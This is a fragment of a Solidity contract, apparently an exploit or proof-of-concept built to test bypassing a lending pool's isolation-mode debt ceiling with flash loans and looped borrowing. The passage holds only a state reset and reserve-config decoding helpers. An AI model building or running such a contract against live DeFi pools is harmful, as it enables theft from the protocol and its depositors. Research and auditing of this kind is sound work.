    accountingUnitRaw = 0;
    borrowChunkRaw = 0;
    trackedDebtBefore = 0;
    trackedDebtAfter = 0;
    remainingCeilingUnitsBefore = 0;
    actualCeilingToBypassRaw = 0;
    requiredBorrowLoops = 0;
    executedBorrowLoops = 0;
    actualBorrowedRaw = 0;
    infeasibilityReason = REASON_NONE;
    hypothesisValidated = false;
    ceilingBypassed = false;
    scannedReserveCount = 0;
    isolatedCollateralReserveCount = 0;
    borrowableIsolationReserveCount = 0;
    lastScannedConfigData = 0;
    lastScannedReserve = address(0);
    poolPriceOracle = address(0);
    selectedCollateralOraclePrice = 0;
    selectedDebtOraclePrice = 0;
    maxBorrowableAgainstHeldCollateralRaw = 0;
    requiredCollateralValueBase = 0;
    bootstrapFundingCostInDebtAssetRaw = 0;
    bootstrapProfitShortfallRaw = 0;
    selectedFlashPair = address(0);
    selectedFlashRouter = address(0);
    selectedFlashPathMid = address(0);
    selectedFlashCollateralTopUpRaw = 0;
    selectedFlashBorrowAmountRaw = 0;
    selectedFlashRepayAmountRaw = 0;
    _clearActiveFlash();
  }

  function _isUsableIsolatedCollateral(uint256 configData) internal pure returns (bool) {
    return
      _flag(configData, ACTIVE_BIT) &&
      !_flag(configData, FROZEN_BIT) &&
      !_flag(configData, PAUSED_BIT) &&
      _ltv(configData) > 0 &&
      _debtCeiling(configData) > 0;
  }

  function _isUsableBorrowableIsolationAsset(uint256 configData) internal pure returns (bool) {
    return
      _flag(configData, ACTIVE_BIT) &&
      !_flag(configData, FROZEN_BIT) &&
      !_flag(configData, PAUSED_BIT) &&
      _flag(configData, BORROWING_BIT) &&
      _flag(configData, BORROWABLE_IN_ISOLATION_BIT);
  }

  function _flag(uint256 configData, uint256 bit) internal pure returns (bool) {
    return ((configData >> bit) & 1) != 0;
  }

  function _ltv(uint256 configData) internal pure returns (uint256) {
    return configData & 0xFFFF;
  }

  function _decimals(uint256 configData) internal pure returns (uint256) {
    return (configData >> DECIMALS_BIT) & 0xFF;
  }

  function _debtCeiling(uint256 configData) internal pure returns (uint256) {
    return (configData >> DEBT_CEILING_BIT) & DEBT_CEILING_MASK;
  }

  function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
    return x == 0 ? 0 : ((x - 1) / y) + 1;
  }
}
